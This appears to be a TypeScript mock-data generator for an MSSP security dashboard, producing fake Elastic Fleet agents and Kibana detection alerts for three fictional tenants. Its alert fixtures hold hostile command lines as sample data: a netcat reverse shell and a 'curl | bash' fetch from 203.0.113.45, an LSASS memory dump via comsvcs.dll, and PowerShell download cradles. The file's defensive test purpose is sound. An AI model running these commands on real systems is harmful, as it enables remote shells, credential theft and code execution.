/**
 * Generated data for `DATA_SOURCE=mock`.
 *
 * Builds a deterministic, Elastic-shaped "cluster" containing several MSSP
 * customers: Fleet agents, agent policies, endpoint metadata and
 * alerts-as-data documents per Kibana space. All hostnames are under the
 * reserved `.example` domain and all hashes are random.
 *
 * Deliberate realism traps:
 *  - Alerts mix dotted `kibana.*` keys with nested ECS objects.
 *  - The `acme` space index also contains copies of `globex` endpoint alerts,
 *    as happens when a space-wide "Endpoint Security" rule is not restricted
 *    by namespace. Correct scoping must never surface them to acme.
 *  - Some agents are Fleet-healthy while Elastic Defend is not.
 *  - Some closed alerts have no closing reason (older Kibana versions).
 */
import type {
	RawAgentPolicy,
	RawAlertHit,
	RawAlertSource,
	RawEndpointMetadata,
	RawFleetAgent,
	RawFleetComponent
} from '../elastic/raw';

interface MockTenantDef {
	id: string;
	spaceId: string;
	namespace: string;
	policies: { id: string; name: string }[];
	prefix: string;
	domain: string;
	subnet: string;
	agentCount: number;
	alertCount: number;
}

const MOCK_TENANTS: MockTenantDef[] = [
	{
		id: 'acme',
		spaceId: 'acme',
		namespace: 'acme',
		policies: [
			{ id: 'acme-workstations', name: 'Acme – Workstations' },
			{ id: 'acme-servers', name: 'Acme – Servers' }
		],
		prefix: 'ACME',
		domain: 'acme.example',
		subnet: '10.10',
		agentCount: 32,
		alertCount: 240
	},
	{
		id: 'globex',
		spaceId: 'globex',
		namespace: 'globex',
		policies: [{ id: 'globex-endpoints', name: 'Globex – Endpoints' }],
		prefix: 'GLBX',
		domain: 'globex.example',
		subnet: '10.20',
		agentCount: 16,
		alertCount: 120
	},
	{
		id: 'initech',
		spaceId: 'initech',
		namespace: 'initech',
		policies: [{ id: 'initech-default', name: 'Initech – Default' }],
		prefix: 'INIT',
		domain: 'initech.example',
		subnet: '10.30',
		agentCount: 6,
		alertCount: 30
	}
];

/** Detection rules per Kibana space (rules are space-scoped saved objects). */
export interface MockRule {
	uuid: string;
	ruleId: string;
	name: string;
	description: string;
}

export interface MockWorld {
	now: number;
	/** `<spaceId>` -> rules in that space */
	rules: Map<string, MockRule[]>;
	agents: RawFleetAgent[];
	policies: RawAgentPolicy[];
	endpointMetadata: Map<string, RawEndpointMetadata>;
	/** alerts alias (`.alerts-security.alerts-<space>`) -> alert hits */
	alertIndices: Map<string, RawAlertHit[]>;
}

// ---------------------------------------------------------------------------
// Deterministic randomness

function mulberry32(seed: number) {
	return () => {
		seed |= 0;
		seed = (seed + 0x6d2b79f5) | 0;
		let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
		t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
		return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
	};
}

class Rng {
	private next: () => number;
	constructor(seed: number) {
		this.next = mulberry32(seed);
	}
	float() {
		return this.next();
	}
	int(min: number, max: number) {
		return Math.floor(this.next() * (max - min + 1)) + min;
	}
	pick<T>(arr: readonly T[]): T {
		return arr[Math.floor(this.next() * arr.length)];
	}
	chance(p: number) {
		return this.next() < p;
	}
	hex(len: number) {
		let s = '';
		while (s.length < len) s += Math.floor(this.next() * 16).toString(16);
		return s;
	}
	uuid() {
		const h = this.hex(32);
		return `${h.slice(0, 8)}-${h.slice(8, 12)}-4${h.slice(13, 16)}-a${h.slice(17, 20)}-${h.slice(20, 32)}`;
	}
	/** Weighted pick: [[value, weight], ...] */
	weighted<T>(items: [T, number][]): T {
		const total = items.reduce((s, [, w]) => s + w, 0);
		let r = this.next() * total;
		for (const [v, w] of items) {
			if ((r -= w) < 0) return v;
		}
		return items[items.length - 1][0];
	}
}

const HOUR = 3600_000;
const DAY = 24 * HOUR;

// ---------------------------------------------------------------------------
// Agents

type OsKind = 'windows' | 'macos' | 'linux';

const OS: Record<
	OsKind,
	{ name: string; family: string; platform: string; versions: [string, string][] }
> = {
	windows: {
		name: 'Windows',
		family: 'windows',
		platform: 'windows',
		versions: [
			['10.0', 'Windows 11 Pro 23H2 (10.0.22631.4317)'],
			['10.0', 'Windows 10 Enterprise 22H2 (10.0.19045.5011)'],
			['10.0', 'Windows Server 2022 Datacenter (10.0.20348.2762)']
		]
	},
	macos: {
		name: 'macOS',
		family: 'darwin',
		platform: 'darwin',
		versions: [
			['15.1', 'macOS Sequoia 15.1'],
			['14.7', 'macOS Sonoma 14.7']
		]
	},
	linux: {
		name: 'Ubuntu',
		family: 'debian',
		platform: 'ubuntu',
		versions: [
			['24.04.1 LTS (Noble Numbat)', 'Ubuntu 24.04.1 LTS'],
			['22.04.5 LTS (Jammy Jellyfish)', 'Ubuntu 22.04.5 LTS']
		]
	}
};

/** What Fleet's available_versions API would return, newest first. */
export const MOCK_AVAILABLE_VERSIONS = ['9.1.4', '9.1.3', '9.1.2', '9.0.7', '8.19.3'];

const AGENT_VERSIONS: [string, number][] = [
	['9.1.4', 6],
	['9.1.2', 3],
	['9.0.7', 2],
	['8.19.3', 1]
];

/**
 * Scenario per agent. As in real Elastic, a Defend policy failure/warning is
 * reported through the endpoint unit (FAILED/DEGRADED), so Fleet shows the agent
 * as Unhealthy; there is no "Fleet healthy, policy failed" scenario.
 */
type Scenario =
	| 'healthy'
	| 'offline'
	| 'fleet_error_defend_failed'
	| 'fleet_degraded'
	| 'policy_warning'
	| 'policy_failure'
	| 'orphaned'
	| 'updating'
	| 'unenrolling'
	| 'inactive'
	| 'no_defend'
	| 'starting';

function scenarioFor(rng: Rng, index: number): Scenario {
	// Guarantee each interesting scenario exists for the first tenant-sized fleets.
	const forced: Scenario[] = [
		'fleet_error_defend_failed',
		'offline',
		'policy_warning',
		'policy_failure',
		'orphaned',
		'fleet_degraded',
		'updating',
		'no_defend',
		'inactive'
	];
	// Every third agent (3, 6, 9, ...) gets the next forced scenario.
	const slot = index / 3 - 1;
	if (index % 3 === 0 && slot >= 0 && slot < forced.length) return forced[slot];
	return rng.weighted<Scenario>([
		['healthy', 70],
		['offline', 7],
		['fleet_error_defend_failed', 3],
		['fleet_degraded', 3],
		['policy_warning', 2],
		['updating', 3],
		['unenrolling', 1],
		['starting', 1],
		['no_defend', 2]
	]);
}

function endpointComponent(status: string, message: string): RawFleetComponent {
	return {
		id: 'endpoint-default',
		type: 'endpoint',
		status,
		message,
		units: [
			{ id: 'endpoint-default-endpoint-policy', type: 'input', status, message },
			{ id: 'endpoint-default', type: 'output', status: 'HEALTHY', message: 'Healthy' }
		]
	};
}

function systemComponents(): RawFleetComponent[] {
	return [
		{
			id: 'system/metrics-default',
			type: 'system/metrics',
			status: 'HEALTHY',
			message: "Healthy: communicating with pid '4412'"
		},
		{
			id: 'filestream-monitoring',
			type: 'filestream',
			status: 'HEALTHY',
			message: "Healthy: communicating with pid '4398'"
		}
	];
}

interface BuiltAgent {
	agent: RawFleetAgent;
	meta?: RawEndpointMetadata;
	os: OsKind;
	users: string[];
}

function buildAgents(t: MockTenantDef, rng: Rng, now: number): BuiltAgent[] {
	const out: BuiltAgent[] = [];
	const firstNames = [
		'jdoe',
		'asmith',
		'mmiller',
		'kwagner',
		'lchen',
		'pnovak',
		'sgarcia',
		'tnguyen',
		'rjohansson',
		'ebauer'
	];
	for (let i = 0; i < t.agentCount; i++) {
		const isServer = i % 5 === 4;
		const os: OsKind = isServer
			? rng.pick(['windows', 'linux'] as const)
			: rng.weighted<OsKind>([
					['windows', 7],
					['macos', 2],
					['linux', 1]
				]);
		const policy = isServer && t.policies.length > 1 ? t.policies[1] : t.policies[0];
		const kind = isServer ? 'SRV' : os === 'macos' ? 'MBP' : 'WS';
		const hostname =
			os === 'windows'
				? `${t.prefix}-${kind}-${String(i + 1).padStart(3, '0')}`
				: `${t.prefix.toLowerCase()}-${kind.toLowerCase()}-${String(i + 1).padStart(3, '0')}.${t.domain}`;
		const scenario = scenarioFor(rng, i);
		const version = rng.weighted(AGENT_VERSIONS);
		const id = rng.uuid();
		const hostId = rng.uuid();
		const [osVersion, osFull] = rng.pick(OS[os].versions);
		const ip = `${t.subnet}.${isServer ? 10 : 50 + Math.floor(i / 200)}.${(i % 200) + 10}`;
		const enrolledAt = new Date(now - rng.int(20, 400) * DAY).toISOString();

		let status = 'online';
		let lastCheckin = new Date(now - rng.int(5, 90) * 1000).toISOString();
		let lastCheckinStatus = 'online';
		let lastCheckinMessage = 'Running';
		let unhealthy: string[] | undefined;
		let upgrade: RawFleetAgent['upgrade_details'] = null;
		let endpoint: RawFleetComponent | undefined = endpointComponent(
			'HEALTHY',
			'Healthy: communicating with endpoint'
		);
		let policyResponse: 'success' | 'warning' | 'failure' = 'success';
		let active = true;

		switch (scenario) {
			case 'offline':
				status = 'offline';
				lastCheckin = new Date(now - rng.int(2, 72) * HOUR).toISOString();
				break;
			case 'inactive':
				status = 'inactive';
				lastCheckin = new Date(now - rng.int(15, 40) * DAY).toISOString();
				break;
			case 'fleet_error_defend_failed':
				status = 'error';
				lastCheckinStatus = 'error';
				lastCheckinMessage = '1 or more components/units in a failed state';
				unhealthy = ['input'];
				endpoint = endpointComponent(
					'FAILED',
					'Failed: endpoint service is not running (code 0xC0000005)'
				);
				policyResponse = 'failure';
				break;
			case 'fleet_degraded':
				status = 'degraded';
				lastCheckinStatus = 'degraded';
				lastCheckinMessage = '1 or more components/units in a degraded state';
				unhealthy = ['input'];
				endpoint = endpointComponent(
					'DEGRADED',
					'Degraded: kernel driver failed to load, running in user mode'
				);
				policyResponse = 'warning';
				break;
			case 'policy_warning':
				// Defend applied its policy only partially; the unit goes DEGRADED.
				status = 'degraded';
				lastCheckinStatus = 'degraded';
				lastCheckinMessage = '1 or more components/units in a degraded state';
				unhealthy = ['input'];
				endpoint = endpointComponent(
					'DEGRADED',
					'Degraded: policy applied with warnings (full disk access not granted)'
				);
				policyResponse = 'warning';
				break;
			case 'policy_failure':
				status = 'error';
				lastCheckinStatus = 'error';
				lastCheckinMessage = '1 or more components/units in a failed state';
				unhealthy = ['input'];
				endpoint = endpointComponent('FAILED', 'Failed: endpoint policy could not be applied');
				policyResponse = 'failure';
				break;
			case 'orphaned':
				// Agent still runs but has lost its Fleet Server connection.
				status = 'orphaned';
				lastCheckin = new Date(now - rng.int(2, 6) * HOUR).toISOString();
				break;
			case 'updating':
				status = 'updating';
				upgrade = { state: 'UPG_DOWNLOADING', target_version: '9.1.4' };
				break;
			case 'unenrolling':
				status = 'unenrolling';
				break;
			case 'starting':
				endpoint = endpointComponent('STARTING', 'Starting');
				break;
			case 'no_defend':
				endpoint = undefined;
				break;
			default:
				break;
		}

		const agent: RawFleetAgent = {
			id,
			type: 'PERMANENT',
			active,
			status,
			policy_id: policy.id,
			policy_revision: rng.int(3, 18),
			enrolled_at: enrolledAt,
			last_checkin: lastCheckin,
			last_checkin_status: lastCheckinStatus,
			last_checkin_message: lastCheckinMessage,
			unhealthy_reason: unhealthy,
			tags: isServer ? ['server', t.id] : [t.id],
			namespaces: [t.spaceId],
			upgrade_details: upgrade,
			components: endpoint ? [endpoint, ...systemComponents()] : systemComponents(),
			// Fleet only has metrics for agents that are currently reporting.
			metrics: ['offline', 'inactive'].includes(status)
				? undefined
				: {
						cpu_avg: Number((0.004 + rng.float() * 0.03).toFixed(4)),
						memory_size_byte_avg: rng.int(150, 420) * 1024 * 1024
					},
			agent: { id, version },
			local_metadata: {
				host: {
					hostname,
					name: hostname,
					id: hostId,
					ip: [ip, `fe80::${rng.hex(4)}:${rng.hex(4)}:${rng.hex(4)}:${rng.hex(4)}`],
					mac: [`00:50:56:${rng.hex(2)}:${rng.hex(2)}:${rng.hex(2)}`],
					architecture: os === 'macos' ? 'arm64' : 'x86_64'
				},
				os: {
					name: os === 'windows' && isServer ? 'Windows Server' : OS[os].name,
					family: OS[os].family,
					platform: OS[os].platform,
					version: osVersion,
					full: osFull,
					kernel:
						os === 'linux' ? '6.8.0-48-generic' : os === 'macos' ? '24.1.0' : '10.0.22631.4317'
				},
				elastic: { agent: { id, version, upgradeable: true, snapshot: false, log_level: 'info' } }
			}
		};

		let meta: RawEndpointMetadata | undefined;
		if (endpoint) {
			meta = {
				metadata: {
					'@timestamp': new Date(lastCheckin).getTime() - rng.int(30, 600) * 1000,
					agent: { id, version },
					host: { hostname, id: hostId, ip: [ip], os: { name: OS[os].name, version: osVersion } },
					Endpoint: {
						status: 'enrolled',
						policy: {
							applied: {
								id: `${policy.id}-defend`,
								name: `${policy.name} – Elastic Defend`,
								status: policyResponse,
								endpoint_policy_version: rng.int(2, 9)
							}
						},
						state: { isolation: false },
						configuration: { isolation: false }
					},
					elastic: { agent: { id } }
				},
				host_status:
					status === 'online'
						? 'healthy'
						: status === 'error' || status === 'degraded'
							? 'unhealthy'
							: status,
				last_checkin: lastCheckin
			};
		}

		const domainUser = t.prefix.toLowerCase();
		const users = isServer
			? ['SYSTEM', `svc_${domainUser}_backup`]
			: [rng.pick(firstNames), rng.pick(firstNames)];
		out.push({ agent, meta, os, users });
	}

	// One isolated workstation, to exercise the read-only isolation badge.
	const isolated = out.find((a) => a.meta && a.agent.status === 'online');
	if (isolated?.meta?.metadata.Endpoint?.state)
		isolated.meta.metadata.Endpoint.state.isolation = true;
	return out;
}

// ---------------------------------------------------------------------------
// Alerts

const ENDPOINT_RULE = {
	name: 'Endpoint Security (Elastic Defend)',
	ruleId: '9a1a2dae-0b5f-4c3d-8305-a268d404c306',
	description:
		'Generates a detection alert each time an Elastic Defend alert is received. Enabling this rule allows you to immediately begin investigating your Endpoint alerts.'
};

const BEHAVIOR_RULES = [
	{
		name: 'Suspicious Microsoft Office Child Process',
		description:
			'Identifies a Microsoft Office application spawning a suspicious child process such as a script interpreter.',
		tactic: 'Initial Access',
		techniqueId: 'T1566.001',
		technique: 'Spearphishing Attachment',
		os: 'windows' as OsKind,
		process: {
			name: 'powershell.exe',
			executable: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
			cmd: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA...'
		},
		parent: {
			name: 'WINWORD.EXE',
			executable: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
			cmd: '"WINWORD.EXE" /n "C:\\Users\\{user}\\Downloads\\Invoice_Q3.docm"'
		}
	},
	{
		name: 'Potential Credential Access via LSASS Memory Dump',
		description:
			'Identifies an attempt to dump the memory of the LSASS process, commonly used to obtain credentials.',
		tactic: 'Credential Access',
		techniqueId: 'T1003.001',
		technique: 'LSASS Memory',
		os: 'windows' as OsKind,
		process: {
			name: 'rundll32.exe',
			executable: 'C:\\Windows\\System32\\rundll32.exe',
			cmd: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Windows\\Temp\\out.dmp full'
		},
		parent: { name: 'cmd.exe', executable: 'C:\\Windows\\System32\\cmd.exe', cmd: 'cmd.exe /c' }
	},
	{
		name: 'Execution of a Downloaded Windows Script',
		description:
			'Identifies the execution of a script file that was recently downloaded from the internet.',
		tactic: 'Execution',
		techniqueId: 'T1059.005',
		technique: 'Visual Basic',
		os: 'windows' as OsKind,
		process: {
			name: 'wscript.exe',
			executable: 'C:\\Windows\\System32\\wscript.exe',
			cmd: 'wscript.exe "C:\\Users\\{user}\\Downloads\\shipment_details.vbs"'
		},
		parent: {
			name: 'explorer.exe',
			executable: 'C:\\Windows\\explorer.exe',
			cmd: 'C:\\Windows\\Explorer.EXE'
		}
	},
	{
		name: 'Persistence via Scheduled Task Creation',
		description:
			'Identifies the creation of a scheduled task by an unusual process, a common persistence mechanism.',
		tactic: 'Persistence',
		techniqueId: 'T1053.005',
		technique: 'Scheduled Task',
		os: 'windows' as OsKind,
		process: {
			name: 'schtasks.exe',
			executable: 'C:\\Windows\\System32\\schtasks.exe',
			cmd: 'schtasks /create /tn "OneDrive Update" /tr "C:\\ProgramData\\odupd.exe" /sc onlogon /rl highest'
		},
		parent: {
			name: 'powershell.exe',
			executable: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
			cmd: 'powershell.exe -ExecutionPolicy Bypass'
		}
	},
	{
		name: 'Linux Reverse Shell via Netcat',
		description:
			'Identifies the execution of a reverse shell using netcat, enabling remote command execution.',
		tactic: 'Execution',
		techniqueId: 'T1059.004',
		technique: 'Unix Shell',
		os: 'linux' as OsKind,
		process: { name: 'nc', executable: '/usr/bin/nc', cmd: 'nc -e /bin/sh 203.0.113.45 4444' },
		parent: {
			name: 'bash',
			executable: '/usr/bin/bash',
			cmd: 'bash -c curl -s http://203.0.113.45/s.sh | bash'
		}
	},
	{
		name: 'Suspicious Launch Agent Creation',
		description: 'Identifies the creation of a LaunchAgent property list by an unsigned process.',
		tactic: 'Persistence',
		techniqueId: 'T1543.001',
		technique: 'Launch Agent',
		os: 'macos' as OsKind,
		process: {
			name: 'osascript',
			executable: '/usr/bin/osascript',
			cmd: 'osascript -e do shell script "cp /tmp/.u ~/Library/LaunchAgents/com.apple.update.plist"'
		},
		parent: { name: 'zsh', executable: '/bin/zsh', cmd: '/bin/zsh -c' }
	}
];

const MEMORY_SIGNATURES = [
	'Windows.Trojan.CobaltStrike',
	'Windows.Trojan.Metasploit',
	'Windows.Trojan.Sliver',
	'Windows.Hacktool.Mimikatz'
];

const CUSTOM_RULES = [
	{
		name: 'Multiple Logon Failures from the Same Source Address',
		description:
			'Detects more than 20 failed logon attempts from one source address within 5 minutes.',
		severity: 'medium' as const,
		risk: 47,
		tactic: 'Credential Access',
		techniqueId: 'T1110',
		technique: 'Brute Force'
	},
	{
		name: 'MSSP – Privileged Group Membership Change',
		description: 'A user was added to a privileged local or domain group.',
		severity: 'high' as const,
		risk: 73,
		tactic: 'Persistence',
		techniqueId: 'T1098',
		technique: 'Account Manipulation'
	},
	{
		name: 'MSSP – Connection to Known Malicious Infrastructure',
		description: 'Outbound connection to an address listed in the MSSP threat-intel feed.',
		severity: 'critical' as const,
		risk: 99,
		tactic: 'Command and Control',
		techniqueId: 'T1071',
		technique: 'Application Layer Protocol'
	}
];

const MALWARE_FILES: Record<
	OsKind,
	{ dir: string; names: string[]; proc: { name: string; executable: string } }
> = {
	windows: {
		dir: 'C:\\Users\\{user}\\Downloads',
		names: [
			'Invoice_8841.exe',
			'Setup_Zoom_x64.exe',
			'scan_2026-10-02.pdf.exe',
			'KMSAuto.exe',
			'payload.dll'
		],
		proc: {
			name: 'msedge.exe',
			executable: 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'
		}
	},
	macos: {
		dir: '/Users/{user}/Downloads',
		names: ['ChromeUpdate.app/Contents/MacOS/ChromeUpdate', 'Installer.pkg', 'Silver.dmg'],
		proc: { name: 'Safari', executable: '/Applications/Safari.app/Contents/MacOS/Safari' }
	},
	linux: {
		dir: '/tmp/.cache',
		names: ['kworkerd', 'xmrig', 'dbus-daemon-x'],
		proc: { name: 'curl', executable: '/usr/bin/curl' }
	}
};

const SEVERITY_RISK = { low: 21, medium: 47, high: 73, critical: 99 } as const;
type Sev = keyof typeof SEVERITY_RISK;

const CLOSE_REASONS: [string | undefined, number][] = [
	['false_positive', 3],
	['true_positive', 3],
	['benign_positive', 2],
	['duplicate', 1],
	['other', 1],
	[undefined, 2] // closed on an older Kibana / without a reason
];

function workflow(rng: Rng, ageDays: number) {
	// Recent alerts are mostly open; older ones mostly closed.
	const pOpen = ageDays < 2 ? 0.75 : ageDays < 7 ? 0.35 : 0.08;
	const pAck = ageDays < 7 ? 0.25 : 0.07;
	const r = rng.float();
	if (r < pOpen) return { status: 'open' as const };
	if (r < pOpen + pAck) return { status: 'acknowledged' as const };
	return { status: 'closed' as const, reason: rng.weighted(CLOSE_REASONS) };
}

function buildAlert(
	t: MockTenantDef,
	host: BuiltAgent,
	rng: Rng,
	now: number,
	ruleUuid: (name: string) => string
): RawAlertSource {
	const ageMs = Math.floor(rng.float() ** 1.6 * 45 * DAY);
	const ts = new Date(now - ageMs);
	const ageDays = ageMs / DAY;
	const user = rng.pick(host.users);
	const wf = workflow(rng, ageDays);
	const a = host.agent;
	const h = a.local_metadata!.host!;
	const os = host.os;

	const kind = rng.weighted<'malware' | 'memory' | 'ransomware' | 'behavior' | 'rule'>([
		['malware', 30],
		['behavior', 35],
		['memory', 12],
		['ransomware', 5],
		['rule', 18]
	]);

	const base: RawAlertSource = {
		'@timestamp': ts.toISOString(),
		'kibana.alert.uuid': rng.hex(64),
		'kibana.alert.workflow_status': wf.status,
		'kibana.alert.workflow_status_updated_at':
			wf.status === 'open'
				? undefined
				: new Date(ts.getTime() + rng.int(10, 600) * 60_000).toISOString(),
		...(wf.status === 'closed' && wf.reason ? { 'kibana.alert.workflow_reason': wf.reason } : {}),
		'kibana.space_ids': [t.spaceId],
		'kibana.alert.original_time': new Date(ts.getTime() - rng.int(1, 30) * 1000).toISOString(),
		agent: { id: a.id, type: 'endpoint', version: a.agent?.version },
		host: {
			id: h.id,
			name: h.hostname,
			hostname: h.hostname,
			ip: h.ip,
			os: {
				name: a.local_metadata?.os?.name,
				full: a.local_metadata?.os?.full,
				family: a.local_metadata?.os?.family
			}
		},
		user: { name: user, domain: os === 'windows' ? t.prefix : undefined },
		data_stream: {
			namespace: t.namespace,
			dataset: kind === 'rule' ? 'system.security' : 'endpoint.alerts',
			type: 'logs'
		},
		// Internal metadata a raw-document dump would leak; the allowlist must drop it.
		'kibana.alert.rule.execution.uuid': rng.uuid(),
		'kibana.alert.rule.parameters': {
			index: ['logs-endpoint.alerts-*'],
			query: 'event.kind:alert and event.module:(endpoint and not endgame)'
		},
		Endpoint: {
			policy: {
				applied: { id: `${a.policy_id}-defend`, artifacts: { global: { version: '1.0.1230' } } }
			}
		}
	};

	const userDir = (s: string) => s.replaceAll('{user}', user);

	if (kind === 'rule') {
		const r = rng.pick(CUSTOM_RULES);
		const src: RawAlertSource = {
			...base,
			'kibana.alert.rule.name': r.name,
			'kibana.alert.rule.uuid': ruleUuid(r.name),
			'kibana.alert.rule.description': r.description,
			'kibana.alert.severity': r.severity,
			'kibana.alert.risk_score': r.risk,
			'kibana.alert.rule.threat': [
				{
					framework: 'MITRE ATT&CK',
					tactic: { name: r.tactic },
					technique: [{ id: r.techniqueId, name: r.technique }]
				}
			],
			'kibana.alert.reason': `event on ${h.hostname} created ${r.severity} alert ${r.name}.`,
			event: { kind: 'signal', category: ['authentication'], module: 'system' }
		};
		if (r.techniqueId === 'T1110')
			(src as Record<string, unknown>).source = { ip: `198.51.100.${rng.int(2, 250)}` };
		if (r.techniqueId === 'T1071') {
			(src as Record<string, unknown>).destination = { ip: `203.0.113.${rng.int(2, 250)}` };
			(src as Record<string, unknown>).process = {
				name: os === 'windows' ? 'svchost.exe' : 'python3',
				pid: rng.int(500, 9000)
			};
		}
		return src;
	}

	const prevented = rng.chance(kind === 'ransomware' || kind === 'memory' ? 0.85 : 0.65);
	const endpointBase: RawAlertSource = {
		...base,
		'kibana.alert.rule.name': ENDPOINT_RULE.name,
		'kibana.alert.rule.uuid': ruleUuid(ENDPOINT_RULE.name),
		'kibana.alert.rule.rule_id': ENDPOINT_RULE.ruleId,
		'kibana.alert.rule.description': ENDPOINT_RULE.description,
		'kibana.alert.original_event.module': 'endpoint',
		'kibana.alert.original_event.kind': 'alert',
		'kibana.alert.original_event.dataset': 'endpoint.alerts'
	};

	if (kind === 'malware') {
		const f = MALWARE_FILES[os];
		const fname = rng.pick(f.names);
		const dir = userDir(f.dir);
		const sep = os === 'windows' ? '\\' : '/';
		const sev: Sev = rng.weighted<Sev>([
			['high', 3],
			['critical', 1],
			['medium', 1]
		]);
		return {
			...endpointBase,
			message: prevented ? 'Malware Prevention Alert' : 'Malware Detection Alert',
			'kibana.alert.severity': sev,
			'kibana.alert.risk_score': SEVERITY_RISK[sev],
			'kibana.alert.original_event.code': 'malicious_file',
			'kibana.alert.original_event.action': rng.pick(['creation', 'modification', 'execution']),
			'kibana.alert.original_event.type': prevented ? ['info', 'denied'] : ['info', 'allowed'],
			'kibana.alert.reason': `malware, intrusion_detection, file event with process ${f.proc.name}, file ${fname}, on ${h.hostname} created ${sev} alert Endpoint Security.`,
			event: {
				code: 'malicious_file',
				module: 'endpoint',
				kind: 'signal',
				category: ['malware', 'intrusion_detection', 'file'],
				type: prevented ? ['info', 'denied'] : ['info', 'allowed'],
				outcome: 'success'
			},
			file: {
				name: fname.split('/').pop(),
				path: `${dir}${sep}${fname}`,
				size: rng.int(40_000, 9_000_000),
				hash: { sha256: rng.hex(64), md5: rng.hex(32) },
				code_signature: { exists: false, trusted: false },
				Ext: {
					quarantine_result: prevented,
					quarantine_path: prevented ? 'C:\\.equarantine\\' + rng.hex(16) : undefined,
					malware_classification: {
						identifier: 'endpointpe-v4-model',
						score: Number((0.8 + rng.float() * 0.2).toFixed(4)),
						threshold: 0.58
					}
				}
			},
			process: {
				name: f.proc.name,
				executable: f.proc.executable,
				pid: rng.int(1000, 15000),
				Ext: { user },
				entity_id: rng.hex(40)
			}
		};
	}

	if (kind === 'memory') {
		const shellcode = os === 'windows' ? rng.chance(0.5) : false;
		const sev: Sev = 'critical';
		if (shellcode || os !== 'windows') {
			const injector = rng.int(1000, 15000);
			return {
				...endpointBase,
				message: prevented
					? 'Memory Threat Prevention Alert: Shellcode Injection'
					: 'Memory Threat Detection Alert: Shellcode Injection',
				'kibana.alert.severity': 'high',
				'kibana.alert.risk_score': SEVERITY_RISK.high,
				'kibana.alert.original_event.code': 'shellcode_thread',
				'kibana.alert.original_event.action': 'start',
				'kibana.alert.original_event.type': prevented ? ['info', 'denied'] : ['info', 'allowed'],
				event: {
					code: 'shellcode_thread',
					module: 'endpoint',
					kind: 'signal',
					category: ['malware', 'intrusion_detection'],
					type: prevented ? ['info', 'denied'] : ['info', 'allowed']
				},
				process: {
					name: os === 'windows' ? 'rundll32.exe' : 'python3',
					executable: os === 'windows' ? 'C:\\Windows\\System32\\rundll32.exe' : '/usr/bin/python3',
					pid: injector,
					command_line:
						os === 'windows'
							? 'rundll32.exe C:\\ProgramData\\upd\\x64.dll,Start'
							: 'python3 -c import ctypes...',
					Ext: { user },
					parent: { name: os === 'windows' ? 'explorer.exe' : 'bash', pid: rng.int(300, 900) }
				},
				// As in a real Defend 9.5.5 shellcode-thread alert (lab, Windows Server 2025):
				// the injector started its target, private RWX memory, unbacked thread start.
				Target: {
					process: {
						name: os === 'windows' ? 'notepad.exe' : 'sleep',
						pid: rng.int(1000, 15000),
						ppid: injector,
						executable: os === 'windows' ? 'C:\\Windows\\System32\\notepad.exe' : '/usr/bin/sleep',
						Ext: { memory_region: { region_protection: 'RWX', allocation_type: 'PRIVATE' } },
						thread: { Ext: { start_address_module: 'Unbacked' } }
					}
				},
				Memory_protection: {
					feature: 'shellcode_thread',
					self_injection: false,
					cross_session: false,
					parent_to_child: true
				}
			};
		}
		const sig = rng.pick(MEMORY_SIGNATURES);
		return {
			...endpointBase,
			message: prevented
				? `Memory Threat Prevention Alert: ${sig}`
				: `Memory Threat Detection Alert: ${sig}`,
			'kibana.alert.severity': sev,
			'kibana.alert.risk_score': SEVERITY_RISK[sev],
			'kibana.alert.original_event.code': 'memory_signature',
			'kibana.alert.original_event.action': 'scan',
			'kibana.alert.original_event.type': prevented ? ['info', 'denied'] : ['info', 'allowed'],
			event: {
				code: 'memory_signature',
				module: 'endpoint',
				kind: 'signal',
				category: ['malware', 'intrusion_detection'],
				type: prevented ? ['info', 'denied'] : ['info', 'allowed']
			},
			process: {
				name: 'powershell.exe',
				executable: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
				pid: rng.int(1000, 15000),
				command_line:
					'powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(...))',
				// Signature location as in Kibana's EndpointDocGenerator.generateMemoryAlert.
				Ext: {
					user,
					malware_signature: { all_names: sig, identifier: 'diagnostic-malware-signature-v1' }
				},
				parent: {
					name: 'cmd.exe',
					executable: 'C:\\Windows\\System32\\cmd.exe',
					pid: rng.int(300, 900)
				}
			},
			Memory_protection: { feature: 'signature', self_injection: true }
		};
	}

	if (kind === 'ransomware') {
		const base2 = os === 'windows' ? `C:\\Users\\${user}\\Documents` : `/home/${user}/Documents`;
		const sep = os === 'windows' ? '\\' : '/';
		const files = [
			'Q3-financials.xlsx',
			'contracts',
			'board-minutes.docx',
			'payroll_2026.csv',
			'scans'
		].map((f) => `${base2}${sep}${f}`);
		// Shape of a real Defend 9.5.5 canary alert (lab, Windows Server 2025).
		const touched = files.slice(0, rng.int(1, 3));
		return {
			...endpointBase,
			message: prevented ? 'Ransomware Prevention Alert' : 'Ransomware Detection Alert',
			// Real canary alerts carry event.severity 73, so the rule rates them high.
			'kibana.alert.severity': 'high',
			'kibana.alert.risk_score': 73,
			'kibana.alert.original_event.code': 'ransomware',
			'kibana.alert.original_event.action': 'canary-activity',
			'kibana.alert.original_event.type': prevented
				? ['info', 'start', 'change', 'denied']
				: ['info', 'start', 'change', 'allowed'],
			event: {
				code: 'ransomware',
				module: 'endpoint',
				kind: 'signal',
				action: 'canary-activity',
				category: ['malware', 'intrusion_detection', 'process', 'file'],
				type: prevented
					? ['info', 'start', 'change', 'denied']
					: ['info', 'start', 'change', 'allowed']
			},
			process: {
				name: os === 'windows' ? 'svhost32.exe' : 'enc',
				executable:
					os === 'windows' ? `C:\\Users\\${user}\\AppData\\Roaming\\svhost32.exe` : '/tmp/.x/enc',
				pid: rng.int(1000, 15000),
				hash: { sha256: rng.hex(64) },
				code_signature: { exists: false, trusted: false },
				Ext: { user },
				parent: { name: os === 'windows' ? 'explorer.exe' : 'bash', pid: rng.int(300, 900) }
			},
			Ransomware: {
				feature: 'canary',
				version: '1.9.0',
				files: touched.map((path) => ({
					path,
					extension: path.split('.').pop(),
					operation: 'overwrite',
